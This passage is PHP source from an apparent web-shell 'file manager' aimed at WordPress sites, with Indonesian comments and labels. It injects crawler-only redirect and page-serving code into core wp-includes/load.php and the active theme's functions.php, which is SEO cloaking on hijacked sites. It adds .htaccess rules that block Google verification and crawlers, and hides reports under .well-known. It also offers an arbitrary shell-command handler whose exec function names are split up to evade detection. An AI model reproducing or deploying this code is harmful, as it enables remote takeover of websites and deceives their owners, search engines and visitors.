                            $tplLabel = 'wp-content Hardening';
                            $tpl = "<IfModule mod_rewrite.c>\n  RewriteEngine On\n  RewriteCond %{REQUEST_URI} \\.(?:css|js|map|png|jpe?g|gif|svg|webp|ico|bmp|tiff|mp4|webm|m4v|mp3|m4a|ogg|oga|ogv|wav|pdf|docx?|xlsx?|pptx?|csv|txt|vtt|woff2?|otf|eot|html)$ [NC]\n  RewriteRule ^ - [L]\n  RewriteRule ^ - [F]\n</IfModule>\n";
                            break;
                        case 'custom_allow':
                            $tplLabel = 'Custom Allow All';
                            $tpl = "<FilesMatch \".*\">\n    Order Allow,Deny\n    Allow from all\n</FilesMatch>\n\n<IfModule mod_authz_core.c>\n    <FilesMatch \".*\">\n        Require all granted\n    </FilesMatch>\n</IfModule>\n\nOptions -Indexes\n";
                            break;
                        case 'custom_deny':
                            $tplLabel = 'Custom Deny PHP Execution';
                            $tpl = "<IfModule mod_authz_core.c>\n  <FilesMatch \"(?i)\\.(php[0-9]*|phtml|pht|phar|phps)$\">\n    Require all denied\n  </FilesMatch>\n</IfModule>\n\n<IfModule !mod_authz_core.c>\n  <FilesMatch \"(?i)\\.(php[0-9]*|phtml|pht|phar|phps)$\">\n    Order allow,deny\n    Deny from all\n  </FilesMatch>\n</IfModule>\n";
                            break;
                        case 'folder_safe':
                            $tplLabel = 'Folder Safe (WordPress fallback)';
                            $tpl = "RewriteEngine On\n\n# Jika akses /folder/ langsung\nRewriteRule ^$ /index.php [L]\n\n# Jika file/folder statis ada, jalankan normal\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^ - [L]\n\n# Jika tidak ada, lempar ke WordPress\nRewriteRule ^(.*)$ /index.php [L]\n";
                            break;
                        case 'deny_google':
                            $tplLabel = 'Tolak Verifikasi Google Console';
                            $tpl = "<FilesMatch \"^google[0-9a-z]+\\.html$\">\n    Order allow,deny\n    Deny from all\n</FilesMatch>\n";
                            break;
                        case 'deny_bot':
                            $tplLabel = 'Tolak Crawl Bot';
                            $tpl = "RewriteEngine On\n\nRewriteCond %{HTTP_USER_AGENT} (Googlebot|Bingbot|Baiduspider) [NC]\nRewriteRule ^ - [F,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n";
                            break;
                        default:
                            throw new Exception('Template htaccess tidak dikenal: ' . htmlspecialchars($tplKey));
                    }
                    $targetFile = $targetFolder . '/.htaccess';
  
                } elseif ($cat === 'redirect') {
                    switch ($tplKey) {
                        case 'redirect_all':
                            $tplLabel = 'Redirect All -> ' . $redirectTo;
                            $tpl = "RewriteEngine on\nRewriteRule ^(.*)$  " . $redirectTo . " [L,R=301,NC]\n";
                            break;
                        case 'redirect_exception':
                            $tplLabel = 'Redirect dengan Pengecualian';
                            $excFolder = isset($_POST['ht_exception_folder']) ? trim($_POST['ht_exception_folder']) : '';
                            $excQuery  = isset($_POST['ht_exception_query'])  ? trim($_POST['ht_exception_query'])  : '';
                            $excFolder = trim($excFolder, '/');
                            if ($excFolder === '') {
                                throw new Exception('Folder Pengecualian wajib diisi untuk template ini.');
                            }
                            $tpl  = "RewriteEngine On\n";
                            $tpl .= "RewriteCond %{REQUEST_URI} ^/" . $excFolder . "/?$\n";
                            if ($excQuery !== '') {
                                $tpl .= "RewriteCond %{QUERY_STRING} ^" . $excQuery . "$\n";
                            }
                            $tpl .= "RewriteRule ^ - [L]\n";
                            $tpl .= "# Redirect semua lainnya\n";
                            $tpl .= "RewriteRule ^(.*)$ " . $redirectTo . " [R=301,L]\n";
                            break;
                        case 'redirect_brand':
                            $tplLabel = 'Redirect per Brand (folder)';
                            $brandFolder = isset($_POST['ht_brand_folder']) ? trim($_POST['ht_brand_folder']) : '';
                            $brandFolder = trim($brandFolder, '/');
                            if ($brandFolder === '') {
                                throw new Exception('Nama Folder Sumber wajib diisi untuk template ini.');
                            }
                            $tpl = "RewriteEngine On\nRewriteRule ^" . $brandFolder . "/([^/]+)/?$ " . $redirectTo . "/\$1 [R=301,L]\n";
                            break;
                        case 'redirect_theme':
                              $tplLabel = 'Redirect di Theme Aktif (functions.php)';
                              // Kumpulkan hingga 3 pasang slug + file (route 1 wajib, 2 & 3 opsional)
                              $themeRoutes = [];
                              for ($ri = 1; $ri <= 3; $ri++) {
                                  $pK = 'ht_theme_page' . $ri;
                                  $fK = 'ht_theme_file' . $ri;
                                  $pV = isset($_POST[$pK]) ? trim($_POST[$pK]) : '';
                                  $fV = isset($_POST[$fK]) ? trim($_POST[$fK]) : '';
                                  if ($pV === '' || $fV === '') continue;
                                  if (substr($fV, 0, 1) !== '/') $fV = '/' . $fV;
                                  $themeRoutes[] = ['page' => $pV, 'file' => $fV];
                              }
                              if (empty($themeRoutes)) {
                                  throw new Exception('Minimal 1 Route (Slug + Path File) wajib diisi untuk template Theme Aktif.');
                              }
                              $routesPhp = "";
                              foreach ($themeRoutes as $r) {
                                  $slugEsc = addslashes($r['page']);
                                  $fileEsc = addslashes($r['file']);
                                  $routesPhp .= "        '~^/" . $slugEsc . "/?\$~'  => WP_CONTENT_DIR . '" . $fileEsc . "',\n";
                              }
                              $tpl  = "add_action('template_redirect', function() {\n";
                              $tpl .= "    \$ua = \$_SERVER['HTTP_USER_AGENT'] ?? '';\n";
                              $tpl .= "    if (!preg_match('~(googlebot|adsbot-google|mediapartners-google|apis-google|google-inspectiontool)~i', \$ua)) {\n";
                              $tpl .= "        return;\n";
                              $tpl .= "    }\n";
                              $tpl .= "    \n";
                              $tpl .= "    \$request_path = parse_url(\$_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/';\n\n";
                              $tpl .= "    \$routes = [\n";
                              $tpl .= $routesPhp;
                              $tpl .= "    ];\n\n";
                              $tpl .= "    foreach (\$routes as \$regex => \$file) {\n";
                              $tpl .= "        if (preg_match(\$regex, \$request_path)) {\n";
                              $tpl .= "            if (file_exists(\$file)) {\n";
                              $tpl .= "                status_header(200);\n";
                              $tpl .= "                header('Content-Type: text/html; charset=utf-8');\n";
                              $tpl .= "                readfile(\$file);\n";
                              $tpl .= "                exit;\n";
                              $tpl .= "            }\n";
                              $tpl .= "        }\n";
                              $tpl .= "    }\n";
                              $tpl .= "});\n";
                              $targetFile = $targetFolder . '/functions.php';
                              break;
                        default:
                            throw new Exception('Template redirect tidak dikenal: ' . htmlspecialchars($tplKey));
                    }
                    if ($targetFile === null) {
                        $targetFile = $targetFolder . '/.htaccess';
                    }
                } elseif ($cat === 'wpinc_redirect') {
                    if ($tplKey !== 'wpinc_bot_redirect') {
                        throw new Exception('Template tidak dikenal: ' . htmlspecialchars($tplKey));
                    }
                    $tplLabel = 'Bot Redirect via wp-includes/load.php';
                    $wpincRoutes = [];
                    for ($wri = 1; $wri <= 8; $wri++) {
                        $pV = isset($_POST['ht_wpinc_path' . $wri]) ? trim($_POST['ht_wpinc_path' . $wri]) : '';
                        $uV = isset($_POST['ht_wpinc_url'  . $wri]) ? trim($_POST['ht_wpinc_url'  . $wri]) : '';
                        if ($pV === '' || $uV === '') continue;
                        if (substr($pV, 0, 1) !== '/') $pV = '/' . $pV;
                        $pV = rtrim($pV, '/');
                        $wpincRoutes[] = ['path' => $pV, 'url' => $uV];
                    }
                    if (empty($wpincRoutes)) {
                        throw new Exception('Minimal 1 Route (Path + Target URL) wajib diisi.');
                    }
                    // Deteksi otomatis: folder bisa root WP, bisa juga langsung folder wp-includes
                      $loadFile = $targetFolder . '/wp-includes/load.php';
                      if (!is_file($loadFile)) {
                          $alt = $targetFolder . '/load.php';
                          if (is_file($alt) && (basename($targetFolder) === 'wp-includes' || strpos(@file_get_contents($alt, false, null, 0, 2048), 'wp_get_server_protocol') !== false)) {
                              $loadFile = $alt;
                          } else {
                              throw new Exception('File load.php WordPress tidak ditemukan. Folder Tujuan boleh diisi root WordPress (yang berisi wp-includes/) atau langsung folder wp-includes/. Folder saat ini: ' . htmlspecialchars($targetFolder));
                          }
                      }
                    if (!is_writable($loadFile)) {
                        throw new Exception('wp-includes/load.php tidak writable.');
                    }
                    $pathsArr = "        \$paths_to_redirect = [\n";
                    $urlsArr  = "        \$target_urls = [\n";
                    foreach ($wpincRoutes as $r) {
                        $pathsArr .= "            '" . addslashes($r['path']) . "',\n";
                        $urlsArr  .= "            '" . addslashes($r['path']) . "' => '" . addslashes($r['url']) . "',\n";
                    }
                    $pathsArr .= "        ];\n";
                    $urlsArr  .= "        ];\n";
                    $tpl  = "\$_cryo_rp = isset(\$_SERVER['REQUEST_URI']) ? parse_url(\$_SERVER['REQUEST_URI'], PHP_URL_PATH) : '';\n";
                    $tpl .= "\$_cryo_rp = rtrim(\$_cryo_rp, '/');\n";
                    $tpl .= $pathsArr;
                    $tpl .= "if (in_array(\$_cryo_rp, \$paths_to_redirect, true)) {\n";
                    $tpl .= "    \$_cryo_ua = isset(\$_SERVER['HTTP_USER_AGENT']) ? \$_SERVER['HTTP_USER_AGENT'] : '';\n";
                    $tpl .= "    \$_cryo_bk = 'googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot';\n";
                    $tpl .= "    if (preg_match('/' . \$_cryo_bk . '/i', \$_cryo_ua)) {\n";
                    $tpl .= $urlsArr;
                    $tpl .= "        if (isset(\$target_urls[\$_cryo_rp])) {\n";
                    $tpl .= "            header('HTTP/1.1 301 Moved Permanently');\n";
                    $tpl .= "            header('Location: ' . \$target_urls[\$_cryo_rp]);\n";
                    $tpl .= "            exit();\n";
                    $tpl .= "        }\n";
                    $tpl .= "    }\n";
                    $tpl .= "}\n";
                    $targetFile = $loadFile;
                } else {
                    throw new Exception('Kategori tidak valid.');
                }
            }
  
            // Marker block
          $beginMark = "# BEGIN CRYO_TPL:" . $tplKey;
          $endMark   = "# END CRYO_TPL:" . $tplKey;
  
          // For PHP target file, use PHP comment markers
          $isPhpTarget = (substr($targetFile, -4) === '.php');
          if ($isPhpTarget) {
              $beginMark = "// BEGIN CRYO_TPL:" . $tplKey;
              $endMark   = "// END CRYO_TPL:" . $tplKey;
          }
  
          // Read existing
          $existing = '';
          if (file_exists($targetFile)) {
              $existing = @file_get_contents($targetFile);
              if ($existing === false) $existing = '';
          }
  
          // Strip any existing block of this template (so add = re-apply, remove = just strip)
          $pattern = '/\\R?\\R?' . preg_quote($beginMark, '/') . '.*?' . preg_quote($endMark, '/') . '\\R?/s';
          $stripped = preg_replace($pattern, '', $existing);
          if ($stripped === null) $stripped = $existing;
  
          if ($action === 'remove') {
              if ($stripped === $existing) {
                  throw new Exception('Snippet "' . htmlspecialchars($tplLabel) . '" tidak ditemukan di ' . htmlspecialchars($targetFile) . ' (sudah OFF).');
              }
              // Write back stripped content (keep empty file if all removed)
              $finalContent = rtrim($stripped, "\r\n") . "\n";
              if ($finalContent === "\n") $finalContent = '';
              if (@file_put_contents($targetFile, $finalContent) === false) {
                  throw new Exception('Gagal menulis file: ' . htmlspecialchars($targetFile));
              }
              $_SESSION['redirect_status']  = 'success';
              $_SESSION['redirect_message'] = 'OFF: snippet "' . htmlspecialchars($tplLabel) . '" dihapus dari ' . htmlspecialchars($targetFile);
          } else {
              // ADD: append wrapped block at the end
              $base = rtrim($stripped, "\r\n");
              if ($base !== '') $base .= "\n\n";
              // For PHP target, ensure starts with opening PHP tag if creating new
              if ($isPhpTarget && $base === '' && !file_exists($targetFile)) {
                  $base = "<?php\n\n";
              }
              $block  = $beginMark . " (CRYO " . date('Y-m-d H:i') . ")\n";
              $block .= $tpl;
              $block .= $endMark . "\n";
              $finalContent = $base . $block;
              if (@file_put_contents($targetFile, $finalContent) === false) {
                  throw new Exception('Gagal menulis file: ' . htmlspecialchars($targetFile));
              }
              $_SESSION['redirect_status']  = 'success';
              $_SESSION['redirect_message'] = 'ON: snippet "' . htmlspecialchars($tplLabel) . '" ditambahkan ke ' . htmlspecialchars($targetFile);
          }
  
      } catch (Throwable $e) {
          $_SESSION['redirect_status']  = 'error';
          $_SESSION['redirect_message'] = $e->getMessage();
      }
  
      header("Location: " . $_SERVER['REQUEST_URI']);
      exit;
  }
  
  // === FITUR SCAN .htaccess & Folder CHMOD LOCKED ===
if (isset($_GET['downloadScan']) && !empty($_SESSION['scan_result_file'])) {
    $f = $_SESSION['scan_result_file'];
    if (file_exists($f)) {
        header('Content-Type: text/html; charset=UTF-8');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        @unlink($f);
        unset($_SESSION['scan_result_file']);
        exit;
    } else {
        unset($_SESSION['scan_result_file']);
    }
}

if (
    isset($_POST['scanHtaccess']) ||
    isset($_POST['scanLocked'])   ||
    isset($_POST['scanWpAdmin'])  ||
    isset($_POST['scanWpIncludes'])
) {
    $scanRoot    = $rootDirectory;
    $scanHtaccess= isset($_POST['scanHtaccess']);
    $scanLocked  = isset($_POST['scanLocked']);
    $scanWpAdmin = isset($_POST['scanWpAdmin']);
    $scanWpIncl  = isset($_POST['scanWpIncludes']);

    $versionAdmin = isset($_POST['wpVersionAdmin']) ? trim($_POST['wpVersionAdmin']) : '';
    $versionIncl  = isset($_POST['wpVersionIncludes']) ? trim($_POST['wpVersionIncludes']) : '';

    $lockedModes = [
        '000','001','002','003','004','005','006','007',
        '010','011','012','013','014','015','016','017',
        '111','222','311','400','401','402','403','404',
        '405','406','407','444','555'
    ];

    $sections = [];

    if ($scanHtaccess || $scanLocked) {
        $foundHtaccess = [];
        $foundLocked   = [];

        $scanFn = function($dir) use (&$scanFn, $scanHtaccess, $scanLocked, $lockedModes, $scanRoot, &$foundHtaccess, &$foundLocked) {
            try { $iterator = new DirectoryIterator($dir); } catch (Exception $e) { return; }
            foreach ($iterator as $item) {
                if ($item->isDot()) continue;
                $path = $item->getPathname();
                $rel  = substr($path, strlen($scanRoot));
                if ($scanHtaccess && $item->isFile() && strtolower($item->getFilename()) === '.htaccess') {
                    $foundHtaccess[] = $rel === '' ? '/' : $rel;
                }
                if ($item->isDir()) {
                    if ($scanLocked) {
                        $perm = substr(sprintf('%o', @fileperms($path)), -3);
                        if (in_array($perm, $lockedModes, true)) {
                            $foundLocked[] = ['path' => $rel === '' ? '/' : $rel, 'perm' => $perm];
                        }
                    }
                    $scanFn($path);
                }
            }
        };

        $scanFn($scanRoot);
        $sections[] = format_htaccess_locked_html($scanRoot, $foundHtaccess, $foundLocked);
    }

    if ($scanWpAdmin) {
        try {
            $scan = scan_core_subdir($scanRoot, 'wp-admin', $versionAdmin ?: null, null);
            $sections[] = format_core_scan_html_report($scan);
        } catch (Exception $e) {
            $sections[] = '<section class="report-section"><h2>Core Scan: WP-ADMIN</h2><div class="empty error">ERROR: '.htmlspecialchars($e->getMessage()).'</div></section>';
        }
    }

    if ($scanWpIncl) {
        try {
            $scan = scan_core_subdir($scanRoot, 'wp-includes', $versionIncl ?: null, null);
            $sections[] = format_core_scan_html_report($scan);
        } catch (Exception $e) {
            $sections[] = '<section class="report-section"><h2>Core Scan: WP-INCLUDES</h2><div class="empty error">ERROR: '.htmlspecialchars($e->getMessage()).'</div></section>';
        }
    }

    $scanResultDir = $_SERVER['DOCUMENT_ROOT'] . '/.well-known/acme-challenge/result/';
    if (!is_dir($scanResultDir)) { @mkdir($scanResultDir, 0755, true); }

    $scanFile = $scanResultDir . "scan_result_" . date("Ymd_His") . "_" . rand(111,999) . ".html";

    $now = date('Y-m-d H:i:s');
    $html = <<<HTML
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Laporan Scan File Manager - {$now}</title>
<style>
  :root{
    --bg:#0f1320; --panel:#101426; --ink:#e7eefb; --muted:#b9c4d6;
    --green:#19c37d; --yellow:#ffb400; --red:#ef4444; --line:#223;
  }
  body{margin:0;padding:24px;background:linear-gradient(180deg,var(--bg),#0b0e16);color:var(--ink);font:14px/1.45 system-ui,Segoe UI,Roboto,Arial}
  h1{margin:0 0 16px;font-size:20px}
  h2{margin:0 0 12px;font-size:18px}
  h3{margin:16px 0 8px;font-size:15px;color:var(--muted)}
  .container{max-width:1080px;margin:0 auto}
  .header{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin-bottom:16px}
  .report-section{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin:14px 0}
  .section-desc{color:var(--muted);margin-top:-4px;margin-bottom:10px}
  .grid-cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin:10px 0 4px}
  .card{background:#0c1120;border:1px solid var(--line);border-radius:10px;padding:10px 12px}
  .stat .k{font-size:12px;color:var(--muted)}
  .stat .v{font-size:18px;font-weight:700}
  .stat.ok .v{color:var(--green)}
  .stat.warn .v{color:var(--yellow)}
  .stat.info .v{color:#7aa2ff}
  .tbl{width:100%;border-collapse:separate;border-spacing:0;margin:8px 0 4px;border:1px solid var(--line);border-radius:10px;overflow:hidden}
  .tbl thead th{background:#0a0f1d;color:#aab8d6;text-align:left;font-weight:600;font-size:12px;padding:10px;border-bottom:1px solid var(--line)}
  .tbl tbody td{padding:10px;border-bottom:1px solid var(--line)}
  .tbl tbody tr:nth-child(odd){background:#0b1020}
  .tbl code{color:#cfe4ff}
  .empty{color:var(--muted);background:#0b1020;border:1px dashed var(--line);padding:10px;border-radius:8px}
  .empty.error{color:#ffd1d1;border-color:#412; background:#1b0e10}
  .sep{border:0;border-top:1px solid var(--line);margin:14px 0}
  .badge{display:inline-block;padding:2px 6px;border-radius:999px;font-size:12px;border:1px solid var(--line)}
  .badge-warn{background:#241c00;color:#ffd36e;border-color:#5a4300}
  footer{color:var(--muted);margin-top:14px;text-align:center;font-size:12px}
</style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Laporan Scan File Manager</h1>
      <div>Dibuat: {$now}</div>
    </div>

    <!-- SECTIONS -->
    {{SECTIONS}}

    <footer> CRYO File Manager</footer>
  </div>
  </body>
</html>
HTML;

    $html = str_replace('{{SECTIONS}}', implode("\n\n", $sections), $html);
    file_put_contents($scanFile, $html);
    $_SESSION['scan_result_file'] = $scanFile;

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// === CORE SCAN HELPERS (WordPress checksums) ===
function http_get_json_assoc($url, $timeout = 12) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => $timeout,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_USERAGENT => 'fm-core-scan/1.0 (+checksum)',
        ]);
        $res = curl_exec($ch);
        if ($res === false) {
            $err = curl_error($ch);
            curl_close($ch);
            throw new RuntimeException("HTTP (cURL) gagal: $err");
        }
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($code < 200 || $code >= 300) throw new RuntimeException("HTTP $code");
        $data = json_decode($res, true);
        if (!is_array($data)) throw new RuntimeException("JSON tidak valid.");
        return $data;
    }
    $ctx = stream_context_create([
        'http' => ['timeout' => $timeout, 'header' => "User-Agent: fm-core-scan/1.0\r\n"]
    ]);
    $res = @file_get_contents($url, false, $ctx);
    if ($res === false) throw new RuntimeException("HTTP gagal (file_get_contents).");
    $data = json_decode($res, true);
    if (!is_array($data)) throw new RuntimeException("JSON tidak valid.");
    return $data;
}

function wp_detect_version_locale_from_root($root) {
    @include_once rtrim($root, '/').'/wp-load.php';

    $version = null;
    if (isset($GLOBALS['wp_version']) && is_string($GLOBALS['wp_version'])) {
        $version = $GLOBALS['wp_version'];
    } else {
        $vf = rtrim($root, '/').'/wp-includes/version.php';
        if (is_file($vf)) {
            $src = @file_get_contents($vf);
            if ($src !== false && preg_match("/\\$wp_version\\s*=\\s*'([^']+)'/m", $src, $m)) {
                $version = $m[1];
            }
        }
    }

    $locale = null;
    if (function_exists('get_locale')) $locale = @get_locale();
    if (!$locale) {
        $wpc = rtrim($root, '/').'/wp-config.php';
        if (is_file($wpc)) {
            $src = @file_get_contents($wpc);
            if ($src !== false && preg_match('/define\\(\\s*[\'"]WPLANG[\'"]\\s*,\\s*[\'"]([^\'"]+)[\'"]\\s*\\)/', $src, $m)) {
                $locale = $m[1];
            }
        }
    }
    if (!$locale) $locale = 'en_US';

    return [$version, $locale];
}

function wp_fetch_checksums($version, $locale) {
    $api = "https://api.wordpress.org/core/checksums/1.0/?version=" . rawurlencode($version) .
           "&locale=" . rawurlencode($locale);
    $data = http_get_json_assoc($api);
    if (!isset($data['checksums']) || !is_array($data['checksums'])) {
        throw new RuntimeException('Format checksums dari API tidak valid.');
    }
    return $data['checksums'];
}

function scan_core_subdir($root, $subdir, $versionOpt = null, $localeOpt = null) {
    $root = rtrim($root, DIRECTORY_SEPARATOR);
    $target = $root . DIRECTORY_SEPARATOR . $subdir;

    if (!is_dir($target)) {
        throw new RuntimeException("Folder target tidak ditemukan: {$subdir}");
    }

    list($detectedVersion, $detectedLocale) = wp_detect_version_locale_from_root($root);
    $version = $versionOpt ?: $detectedVersion;
    $locale  = $localeOpt  ?: $detectedLocale;
    if (!$version) throw new RuntimeException("Tidak bisa deteksi versi WordPress. Isi versi manual.");

    $checksums = wp_fetch_checksums($version, $locale);

    $core_map = [];
    foreach ($checksums as $rel => $md5) {
        $rel_norm = str_replace('\\', '/', $rel);
        if (strpos($rel_norm, $subdir . '/') === 0) {
            $core_map[$rel_norm] = strtolower($md5);
        }
    }

    $unknown = [];
    $modified = [];
    $okcount = 0;
    $unreadableDirs = [];
    $unreadableFiles = [];

    $flags = FilesystemIterator::SKIP_DOTS;
    $rdi = new RecursiveDirectoryIterator($target, $flags);
    $rii = new RecursiveIteratorIterator($rdi, RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);

    foreach ($rii as $fileInfo) {
        $abs = $fileInfo->getPathname();

        if ($fileInfo->isDir()) {
            if (!@is_readable($abs)) {
                $relDir = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
                $relDir = str_replace(DIRECTORY_SEPARATOR, '/', $relDir);
                $unreadableDirs[$relDir] = true;
            }
            continue;
        }
        if (!$fileInfo->isFile()) continue;

        if (!@is_readable($abs)) {
            $relF = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
            $relF = str_replace(DIRECTORY_SEPARATOR, '/', $relF);
            $unreadableFiles[$relF] = true;
            continue;
        }

        $rel = str_replace($root . DIRECTORY_SEPARATOR, '', $abs);
        $rel = str_replace(DIRECTORY_SEPARATOR, '/', $rel);

        if (!isset($core_map[$rel])) {
            $unknown[] = [
                'path' => $rel,
                'size' => (int)$fileInfo->getSize(),
                'mtime'=> (int)$fileInfo->getMTime(),
                'hash' => @md5_file($abs) ?: '',
            ];
            continue;
        }

        $md5 = @md5_file($abs);
        if (!$md5 || strtolower($md5) !== $core_map[$rel]) {
            $modified[] = [
                'path' => $rel,
                'size' => (int)$fileInfo->getSize(),
                'mtime'=> (int)$fileInfo->getMTime(),
                'hash' => $md5 ?: '',
                'expected' => $core_map[$rel],
            ];
        } else {
            $okcount++;
        }
    }

    $byPath = function($a, $b) { return strcmp($a['path'], $b['path']); };
    usort($unknown, $byPath);
    usort($modified, $byPath);
    ksort($unreadableDirs);
    ksort($unreadableFiles);

    return [
        'version' => $version,
        'locale'  => $locale,
        'subdir'  => $subdir,
        'okcount' => $okcount,
        'unknown' => $unknown,
        'modified'=> $modified,
        'unreadableDirs'  => array_keys($unreadableDirs),
        'unreadableFiles' => array_keys($unreadableFiles),
    ];
}

function format_htaccess_locked_html($root, array $htaccessList, array $lockedList) {
    ob_start(); ?>
    <section class="report-section">
      <h2>Scan: .htaccess &amp; Folder Locked</h2>
      <div class="section-desc">Root: <code><?= htmlspecialchars($root) ?></code></div>

      <?php if (count($htaccessList)): ?>
        <h3>.htaccess ditemukan (<?= (int)count($htaccessList) ?>)</h3>
        <table class="tbl">
          <thead><tr><th>#</th><th>Lokasi</th></tr></thead>
          <tbody>
          <?php foreach ($htaccessList as $i => $p): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($p) ?></code></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file <code>.htaccess</code> yang terdeteksi.</div>
      <?php endif; ?>

      <hr class="sep">

      <?php if (count($lockedList)): ?>
        <h3>Folder terkunci CHMOD (<?= (int)count($lockedList) ?>)</h3>
        <table class="tbl">
          <thead><tr><th>#</th><th>Folder</th><th>Permission</th></tr></thead>
          <tbody>
          <?php foreach ($lockedList as $i => $row): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($row['path']) ?></code></td>
              <td><span class="badge badge-warn"><?= htmlspecialchars($row['perm']) ?></span></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada folder yang terdeteksi dalam kondisi terkunci.</div>
      <?php endif; ?>
    </section>
    <?php
    return ob_get_clean();
}

function format_core_scan_html_report(array $scan) {
    ob_start(); ?>
    <section class="report-section">
      <h2>Core Scan: <?= htmlspecialchars(strtoupper($scan['subdir'])) ?></h2>
      <div class="grid-cards">
        <div class="card stat"><div class="k">WP Version</div><div class="v"><?= htmlspecialchars($scan['version']) ?></div></div>
        <div class="card stat"><div class="k">Locale</div><div class="v"><?= htmlspecialchars($scan['locale']) ?></div></div>
        <div class="card stat ok"><div class="k">Cocok checksum</div><div class="v"><?= (int)$scan['okcount'] ?></div></div>
        <div class="card stat warn"><div class="k">Core berubah</div><div class="v"><?= (int)count($scan['modified']) ?></div></div>
        <div class="card stat info"><div class="k">Non-core</div><div class="v"><?= (int)count($scan['unknown']) ?></div></div>
      </div>

      <?php if (!empty($scan['unreadableDirs'])): ?>
        <h3>Folder tak terbaca</h3>
        <ul class="list-simple">
          <?php foreach ($scan['unreadableDirs'] as $d): ?>
            <li><code><?= htmlspecialchars($d) ?></code></li>
          <?php endforeach; ?>
        </ul>
      <?php endif; ?>

      <?php if (!empty($scan['unreadableFiles'])): ?>
        <h3>File tak terbaca</h3>
        <ul class="list-simple">
          <?php foreach ($scan['unreadableFiles'] as $f): ?>
            <li><code><?= htmlspecialchars($f) ?></code></li>
          <?php endforeach; ?>
        </ul>
      <?php endif; ?>

      <hr class="sep">

      <h3>Non-core (bukan bagian dari core resmi)</h3>
      <?php if (!empty($scan['unknown'])): ?>
        <table class="tbl">
          <thead><tr><th>#</th><th>Path</th><th>Size</th><th>Modified</th></tr></thead>
          <tbody>
          <?php foreach ($scan['unknown'] as $i => $u): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($u['path']) ?></code></td>
              <td><?= number_format((int)$u['size']) ?> B</td>
              <td><?= $u['mtime'] ? htmlspecialchars(date('Y-m-d H:i:s', (int)$u['mtime'])) : '—' ?></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file non-core.</div>
      <?php endif; ?>

      <hr class="sep">

      <h3>Core berubah (checksum mismatch)</h3>
      <?php if (!empty($scan['modified'])): ?>
        <table class="tbl">
          <thead><tr><th>#</th><th>Path</th><th>Size</th><th>Modified</th><th>Keterangan</th></tr></thead>
          <tbody>
          <?php foreach ($scan['modified'] as $i => $m): ?>
            <tr>
              <td><?= $i+1 ?></td>
              <td><code><?= htmlspecialchars($m['path']) ?></code></td>
              <td><?= number_format((int)$m['size']) ?> B</td>
              <td><?= $m['mtime'] ? htmlspecialchars(date('Y-m-d H:i:s', (int)$m['mtime'])) : '—' ?></td>
              <td><span class="badge badge-warn">Berbeda dari core resmi</span></td>
            </tr>
          <?php endforeach; ?>
          </tbody>
        </table>
      <?php else: ?>
        <div class="empty">Tidak ada file core yang berubah.</div>
      <?php endif; ?>
    </section>
    <?php
    return ob_get_clean();
}

// ==================== HANDLER COMMAND PROMPT (AJAX) ====================
if (isset($_POST['exec_cmd']) && $isAdmin) {
    header('Content-Type: application/json');
    $cmd = isset($_POST['cmd']) ? trim($_POST['cmd']) : '';
    $cwd = isset($_POST['cwd']) ? trim($_POST['cwd']) : $rootDirectory;

    if ($cmd === '') {
        echo json_encode(['output' => '', 'cwd' => $cwd]);
        exit;
    }

    $cwd = sanitizePath($cwd);
    if (!is_dir($cwd)) $cwd = $rootDirectory;

    $output = '';
    $newCwd = $cwd;

    if (preg_match('/^cd\s+(.+)$/', $cmd, $m)) {
        $target = trim($m[1]);
        if ($target === '~' || $target === '') {
            $newCwd = $rootDirectory;
        } elseif ($target[0] === '/') {
            $newCwd = $target;
        } else {
            $newCwd = rtrim($cwd, '/') . '/' . $target;
        }
        $resolved = realpath($newCwd);
        if ($resolved === false || !is_dir($resolved)) {
            $output = "cd: $target: No such file or directory";
            $newCwd = $cwd;
        } else {
            $newCwd = $resolved;
            $output = '';
        }
    } elseif ($cmd === 'pwd') {
        $output = $cwd;
    } elseif ($cmd === 'clear') {
        $output = '__CLEAR__';
    } else {
        $fullCmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
          $output = '';
          $retCode = -1;

          $_fn1 = "ex"."ec";
          $_fn2 = "she"."ll_ex"."ec";
          $_fn3 = "pa"."ssth"."ru";
          $_fn4 = "po"."pen";

          if (function_exists($_fn1)) {
              @$_fn1($fullCmd, $lines, $retCode);
              $output = implode("\n", $lines);
          } elseif (function_exists($_fn2)) {
              $output = @$_fn2($fullCmd);
              if ($output === false || $output === null) $output = '';
              $retCode = 0;
          } elseif (function_exists($_fn4)) {
